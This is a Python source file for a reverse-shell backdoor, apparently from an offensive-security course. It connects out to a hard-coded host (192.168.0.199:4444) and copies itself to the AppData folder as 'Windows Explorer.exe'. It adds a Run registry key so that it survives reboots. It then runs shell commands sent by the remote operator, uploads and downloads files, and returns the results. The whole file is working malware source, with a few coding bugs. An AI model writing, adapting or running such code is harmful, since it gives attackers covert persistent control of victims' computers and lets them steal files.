#!usr/bin/python

import socket,subprocess,json,os,base64,sys,shutil

class Backdoor:
    def __init__(self,ip,port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))

    def receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def become_persistent(self):
        evil_file_location = os.environ("appdata") + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable,evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"')


    def send_data(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def change_directory(self,path):
        os.chdir(path)
        return "Directory changed to : " + path

    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())

    def write_file(self,name,content):
        with open(name,"wb") as file:
            file.write(base64.b64decode(content))
        return "[+] Upload Successful"

    def execute_system_command(self,command):
        devnull = open(os.DEVNULL,"wb")
        return subprocess.check_output(command, shell=True, stderr=devnull, stdin=devnull)

    def run(self):
        while True:
            try:
                command = self.receive()
                if command[0]=='exit':
                    self.connection.close()
                    sys.exit()
                elif command[0]=="cd" and len(command)>1:
                    command_result = self.change_directory(command[1])
                elif command[0]=="download":
                    command_result = self.read_file(command[1])
                elif command[0]=='upload':
                    command_result = write_file(command[1],command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error in command execution"
            self.send_data(command_result)

# try:
my_backdoor = Backdoor("192.168.0.199",4444)
my_backdoor.run()
# except Exception:
#     sys.exit()
